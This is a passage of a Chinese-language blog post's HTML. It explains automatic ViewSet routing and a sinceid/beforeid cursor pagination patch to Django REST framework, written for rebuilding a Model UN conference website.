    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">__module_name</span> <span class="o">=</span> <span class="s">&#39;.</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">module_name</span>

    <span class="k">def</span> <span class="nf">get_objects</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">mod</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_modules</span><span class="p">():</span>
            <span class="k">yield</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">object_name</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">default_object</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">get_modules</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>

        <span class="k">for</span> <span class="n">app_config</span> <span class="ow">in</span> <span class="n">apps</span><span class="o">.</span><span class="n">get_app_configs</span><span class="p">():</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">module_has_submodule</span><span class="p">(</span><span class="n">app_config</span><span class="o">.</span><span class="n">module</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">module_name</span><span class="p">):</span>
                <span class="k">continue</span>

            <span class="k">yield</span> <span class="n">import_module</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__module_name</span><span class="p">,</span> <span class="n">app_config</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
</code></pre></div>
<p>同时新建一个叫<code>api</code>的 app，在<code>api/core.py</code>中实现自动寻找<code>ViewSet</code>：</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">app_cache</span> <span class="kn">import</span> <span class="n">AppCache</span>

<span class="k">class</span> <span class="nc">APICache</span><span class="p">(</span><span class="n">AppCache</span><span class="p">):</span>

    <span class="n">default_object</span> <span class="o">=</span> <span class="p">()</span>
    <span class="n">object_name</span> <span class="o">=</span> <span class="s">&#39;routers&#39;</span>
    <span class="n">module_name</span> <span class="o">=</span> <span class="s">&#39;routers&#39;</span>

    <span class="k">def</span> <span class="nf">get_routers</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">obj</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_objects</span><span class="p">():</span>
            <span class="n">results</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">results</span>

<span class="n">cache</span> <span class="o">=</span> <span class="n">APICache</span><span class="p">()</span>
</code></pre></div>
<p>在<code>api/urls.py</code>中实现自动路由：</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c"># api/urls.py</span>

<span class="kn">from</span> <span class="nn">django.conf.urls</span> <span class="kn">import</span> <span class="n">url</span><span class="p">,</span> <span class="n">patterns</span><span class="p">,</span> <span class="n">include</span>

<span class="kn">from</span> <span class="nn">rest_framework.routers</span> <span class="kn">import</span> <span class="n">DefaultRouter</span>
<span class="kn">from</span> <span class="nn">rest_framework.viewsets</span> <span class="kn">import</span> <span class="n">ViewSetMixin</span>
<span class="kn">from</span> <span class="nn">rest_framework.views</span> <span class="kn">import</span> <span class="n">APIView</span>

<span class="kn">from</span> <span class="nn">.core</span> <span class="kn">import</span> <span class="n">cache</span>

<span class="n">extra_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">router</span> <span class="o">=</span> <span class="n">DefaultRouter</span><span class="p">()</span>
<span class="k">for</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">obj</span> <span class="ow">in</span> <span class="n">cache</span><span class="o">.</span><span class="n">get_routers</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">callable</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span> <span class="ow">and</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="nb">type</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="nb">basestring</span><span class="p">):</span>
        <span class="n">extra_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">url</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">obj</span><span class="p">))</span>
    <span class="k">elif</span> <span class="nb">issubclass</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">ViewSetMixin</span><span class="p">):</span>
        <span class="n">router</span><span class="o">.</span><span class="n">register</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">obj</span><span class="p">)</span>
    <span class="k">elif</span> <span class="nb">issubclass</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">APIView</span><span class="p">):</span>
        <span class="n">extra_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">url</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">obj</span><span class="o">.</span><span class="n">as_view</span><span class="p">()))</span>

<span class="n">extra_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">url</span><span class="p">(</span><span class="s">r&#39;^&#39;</span><span class="p">,</span> <span class="n">include</span><span class="p">(</span><span class="n">router</span><span class="o">.</span><span class="n">urls</span><span class="p">)))</span>

<span class="n">urlpatterns</span> <span class="o">=</span> <span class="n">patterns</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="p">,</span>
    <span class="n">url</span><span class="p">(</span><span class="s">r&#39;^auth/&#39;</span><span class="p">,</span> <span class="n">include</span><span class="p">(</span><span class="s">&#39;rest_framework.urls&#39;</span><span class="p">,</span> <span class="n">namespace</span> <span class="o">=</span> <span class="s">&#39;rest_framework&#39;</span><span class="p">)),</span>
    <span class="n">url</span><span class="p">(</span><span class="s">r&#39;^root/$&#39;</span><span class="p">,</span> <span class="s">&#39;api.views.root&#39;</span><span class="p">,),</span>
    <span class="o">*</span><span class="n">extra_list</span>
<span class="p">)</span>
</code></pre></div>
<p>之后，只需在每个 app 中定义一个<code>routers.py</code>，并定义<code>routers</code>变量即可实现 <code>ViewSet</code> 的自动路由，例如：</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">.views</span> <span class="kn">import</span> <span class="n">UserAPIViewSet</span>

<span class="n">routers</span> <span class="o">=</span> <span class="p">(</span>
    <span class="p">(</span><span class="s">r&#39;users&#39;</span><span class="p">,</span> <span class="n">UserAPIViewSet</span><span class="p">),</span>
<span class="p">)</span>
</code></pre></div>
<p>非常方便。</p>

<h3>分页机制的进一步改进</h3>

<p><code>rest_framework</code>提供了一个数据分页的机制：透过<code>limit</code>和<code>page</code>这两个 URL 参数可以实现数据的分页以及页码索引。</p>

<p>但这个功能在客户要求的应用场景中似乎并不太实用。毕竟，模联大会是一次节奏紧张的活动，网站并发量大，内容更新频繁，若应用传统分页的构想，可能会出现翻页时浏览到重复内容的情况。除此之外，这样的架构不利于实现<strong>瀑布流式</strong>的界面，因为瀑布流式要求待加载的数据与已加载的数据完美地无缝接合，而这一点对于传统分页架构来说也是力不从心。</p>

<p>曾记得，<a href="http://open.weibo.com/wiki/2/statuses/public_timeline">新浪微博 API </a>中好像有类似的实现：凡是返回一个列表的 API ，返回数据中都会有<code>previous_cursor</code>和<code>next_cursor</code>两个参数，通过这两个参数，开发者可以获取上一份或下一份的数据。受此启发，我决定增强一下<code>rest_framework</code>的分页机制。</p>

<blockquote>
<h4>想法</h4>

<ol>
<li>可在 API 的请求中传入参数 <code>sinceid</code> 或是 <code>beforeid</code>，表示获取<code>id</code>紧跟着<code>&lt;sinceid&gt;</code>或是<code>&lt;beforeid&gt;</code>的一批数据。</li>
<li>当 API 返回值是一个列表时，返回数据中增加两个域<code>since</code>和<code>before</code>，分别是指向上一批数据及下一批数据的 URL。</li>
</ol>
</blockquote>

<p>改动得不多，于是我便直接在别人的代码里开刀了。</p>

<p>首先在<code>rest_framework/</code>中增加一个<code>custom_filters.py</code>，用于存放自定义的过滤器：</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">django_filters</span> <span class="kn">import</span> <span class="n">FilterSet</span><span class="p">,</span> <span class="n">NumberFilter</span>

<span class="n">__all__</span> <span class="o">=</span> <span class="p">[</span><span class="s">&#39;get_timeline_filter&#39;</span><span class="p">,</span> <span class="s">&#39;is_timeline_filter&#39;</span><span class="p">]</span>

<span class="k">class</span> <span class="nc">TimelineFilter</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">pass</span>

<span class="k">def</span> <span class="nf">is_timeline_filter</span><span class="p">(</span><span class="n">obj</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">issubclass</span><span class="p">(</span><span class="n">obj</span><span class="o">.</span><span class="n">__class__</span><span class="p">,</span> <span class="n">TimelineFilter</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_timeline_filter</span><span class="p">(</span><span class="n">model_class</span><span class="p">,</span> <span class="n">base_filter_class</span> <span class="o">=</span> <span class="n">FilterSet</span><span class="p">):</span>
    <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    工厂方法，给不同的模型类指派不同的过滤器</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">base_filter_class</span><span class="p">:</span>
        <span class="n">base_filter_class</span> <span class="o">=</span> <span class="n">FilterSet</span>

    <span class="k">class</span> <span class="nc">_TimelineFilter</span><span class="p">(</span><span class="n">base_filter_class</span><span class="p">,</span> <span class="n">TimelineFilter</span><span class="p">):</span>

        <span class="n">sinceid</span> <span class="o">=</span> <span class="n">NumberFilter</span><span class="p">(</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#39;pk&#39;</span><span class="p">,</span> <span class="n">lookup_type</span> <span class="o">=</span> <span class="s">&#39;gt&#39;</span><span class="p">)</span>
        <span class="n">beforeid</span> <span class="o">=</span> <span class="n">NumberFilter</span><span class="p">(</span><span class="n">name</span> <span class="o">=</span> <span class="s">&#39;pk&#39;</span><span class="p">,</span> <span class="n">lookup_type</span> <span class="o">=</span> <span class="s">&#39;lt&#39;</span><span class="p">)</span>

        <span class="k">class</span> <span class="nc">Meta</span><span class="p">(</span><span class="nb">getattr</span><span class="p">(</span><span class="n">base_filter_class</span><span class="p">,</span><span class="s">&#39;Meta&#39;</span><span class="p">,</span><span class="nb">object</span><span class="p">)):</span>
            <span class="n">model</span> <span class="o">=</span> <span class="n">model_class</span>

    <span class="k">return</span> <span class="n">_TimelineFilter</span>
</code></pre></div>
<p>修改<code>rest_framework/generics.py</code>，为<code>GenericAPIView</code>加入<code>hack_filter_class()</code>方法，放入上面定义的过滤器；再修改<code>get_filter_backends()</code>方法，使其生效：</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">.custom_filters</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c">#...</span>

<span class="k">class</span> <span class="nc">GenericAPIView</span><span class="p">(</span><span class="n">views</span><span class="o">.</span><span class="n">APIView</span><span class="p">):</span>

    <span class="c">#...</span>

    <span class="k">def</span> <span class="nf">hack_filter_class</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">filter_class</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="s">&#39;filter_class&#39;</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">is_timeline_filter</span><span class="p">(</span><span class="n">filter_class</span><span class="p">):</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">filter_class</span> <span class="o">=</span> <span class="n">get_timeline_filter</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">model</span><span class="p">,</span> <span class="n">filter_class</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">get_filter_backends</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        Returns the list of filter backends that this view requires.</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">is_timeline</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">hack_filter_class</span><span class="p">()</span>

        <span class="n">filter_backends</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">filter_backends</span> <span class="ow">or</span> <span class="p">[]</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">filter_backends</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">filter_backend</span><span class="p">:</span>
            <span class="n">warnings</span><span class="o">.</span><span class="n">warn</span><span class="p">(</span>
                <span class="s">&#39;The `filter_backend` attribute and `FILTER_BACKEND` setting &#39;</span>
                <span class="s">&#39;are due to be deprecated in favor of a `filter_backends` &#39;</span>
                <span class="s">&#39;attribute and `DEFAULT_FILTER_BACKENDS` setting, that take &#39;</span>
                <span class="s">&#39;a *list* of filter backend classes.&#39;</span><span class="p">,</span>
                <span class="ne">PendingDeprecationWarning</span><span class="p">,</span> <span class="n">stacklevel</span><span class="o">=</span><span class="mi">2</span>
            <span class="p">)</span>
            <span class="n">filter_backends</span> <span class="o">=</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">filter_backend</span><span class="p">]</span>
        <span class="k">return</span> <span class="n">filter_backends</span>
</code></pre></div>
<p>最后再修改<code>rest_framework/pagination.py</code>，这个模块的功能是给<code>Serializer</code>加入分页机制中一些必要的域，如<code>next</code>和<code>previous</code>：</p>
<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c"># ...</span>
<span class="n">sinceid_field</span> <span class="o">=</span> <span class="s">&#39;sinceid&#39;</span>
<span class="n">beforeid_field</span> <span class="o">=</span> <span class="s">&#39;beforeid&#39;</span>

<span class="k">class</span> <span class="nc">SinceIdField</span><span class="p">(</span><span class="n">serializers</span><span class="o">.</span><span class="n">Field</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">to_native</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">value</span><span class="o">.</span><span class="n">object_list</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">object_list</span><span class="p">[:]</span>
            <span class="n">sinceid</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">obj</span><span class="o">.</span><span class="n">id</span> <span class="k">for</span> <span class="n">obj</span> <span class="ow">in</span> <span class="n">value</span><span class="o">.</span><span class="n">object_list</span><span class="p">)</span> 
        <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">None</span>

        <span class="n">request</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;request&#39;</span><span class="p">)</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">request</span> <span class="ow">and</span> <span class="n">request</span><span class="o">.</span><span class="n">build_absolute_uri</span><span class="p">()</span> <span class="ow">or</span> <span class="s">&#39;&#39;</span>
        <span class="k">return</span> <span class="n">replace_query_params</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="o">**</span><span class="p">{</span>
            <span class="n">sinceid_field</span><span class="p">:</span> <span class="n">sinceid</span><span class="p">,</span>
            <span class="n">beforeid_field</span><span class="p">:</span> <span class="s">&#39;&#39;</span>
        <span class="p">})</span>

<span class="k">class</span> <span class="nc">BeforeIdField</span><span class="p">(</span><span class="n">serializers</span><span class="o">.</span><span class="n">Field</span><span class="p">):</span>

    <span class="k">def</span> <span class="nf">to_native</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">value</span><span class="o">.</span><span class="n">object_list</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">object_list</span><span class="p">[:]</span>
            <span class="n">beforeid</span> <span class="o">=</span> <span class="nb">min</span><span class="p">(</span><span class="n">obj</span><span class="o">.</span><span class="n">id</span> <span class="k">for</span> <span class="n">obj</span> <span class="ow">in</span> <span class="n">value</span><span class="o">.</span><span class="n">object_list</span><span class="p">)</span> 
        <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">None</span>

        <span class="n">request</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&#39;request&#39;</span><span class="p">)</span>
        <span class="n">url</span> <span class="o">=</span> <span class="n">request</span> <span class="ow">and</span> <span class="n">request</span><span class="o">.</span><span class="n">build_absolute_uri</span><span class="p">()</span> <span class="ow">or</span> <span class="s">&#39;&#39;</span>
        <span class="k">return</span> <span class="n">replace_query_params</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="o">**</span><span class="p">{</span>
            <span class="n">beforeid_field</span><span class="p">:</span> <span class="n">beforeid</span><span class="p">,</span>
            <span class="n">sinceid_field</span><span class="p">:</span> <span class="s">&#39;&#39;</span>
        <span class="p">})</span>

<span class="c"># ...</span>

<span class="k">class</span> <span class="nc">PaginationSerializer</span><span class="p">(</span><span class="n">BasePaginationSerializer</span><span class="p">):</span>

    <span class="n">count</span> <span class="o">=</span> <span class="n">serializers</span><span class="o">.</span><span class="n">Field</span><span class="p">(</span><span class="n">source</span><span class="o">=</span><span class="s">&#39;paginator.count&#39;</span><span class="p">)</span>
    <span class="nb">next</span> <span class="o">=</span> <span class="n">NextPageField</span><span class="p">(</span><span class="n">source</span><span class="o">=</span><span class="s">&#39;*&#39;</span><span class="p">)</span>
    <span class="n">previous</span> <span class="o">=</span> <span class="n">PreviousPageField</span><span class="p">(</span><span class="n">source</span><span class="o">=</span><span class="s">&#39;*&#39;</span><span class="p">)</span>
    <span class="n">before</span> <span class="o">=</span> <span class="n">BeforeIdField</span><span class="p">(</span><span class="n">source</span><span class="o">=</span><span class="s">&#39;*&#39;</span><span class="p">)</span>
    <span class="n">since</span> <span class="o">=</span> <span class="n">SinceIdField</span><span class="p">(</span><span class="n">source</span><span class="o">=</span><span class="s">&#39;*&#39;</span><span class="p">)</span>
</code></pre></div>
<p>完成了——在没有修改一处业务逻辑代码的前提下，我增强了分页机制。</p>

<h2><strong>0x04 前端接口</strong></h2>

<p>终于来到前端部分了。</p>

        </section>
        
          <ul class="tag_box inline">
            <li><i class="glyphicon glyphicon-open"></i></li>
            
            


  
     
    	<li><a href="/categories.html#hfmun重构系列-ref">
    		hfmun重构系列 <span>5</span>
    	</a></li>
    
  


          </ul>
          

         
    </article>
  
</div>

<ul class="pager">
  
    <li class="previous">
      <a class="prev" href="/page2/">&larr; 上一页</a>
    </li>
  
  
</ul>

  </div>
</div>


        <a href="https://github.com/hsfzxjy" target="_blank"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/a6677b08c955af8400f44c6298f40e7d19cc5b2d/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f677261795f3664366436642e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png"></a>
      </div>

    </div>

    <div id="footer">
      <div class="container">
        <p class="text-center">
          Powered by Jekyll. Hosted at Github. <br>
          Copyright &copy; hsfzxjy.
        </p>
      </div>
    </div>

    <script type="text/javascript">
    var duoshuoQuery = {short_name:"hsfzxjy"};
      (function() {
        var ds = document.createElement('script');
        ds.type = 'text/javascript';ds.async = true;
        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
        ds.charset = 'UTF-8';
        (document.getElementsByTagName('head')[0] 
         || document.getElementsByTagName('body')[0]).appendChild(ds);
      })();
    </script>
    


    <!-- Latest compiled and minified JavaScript, requires jQuery 1.x (2.x not supported in IE8) -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="/assets/themes/bootstrap-3/bootstrap/js/bootstrap.min.js"></script>
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        extensions: ["tex2jax.js"],
        jax: ["input/TeX", "output/HTML-CSS"],
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"] ],
          displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
          processEscapes: true
        },
        "HTML-CSS": { availableFonts: ["TeX"] }
      });
    </script>
    <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default" defer async="true"></script>
  </body>
</html>

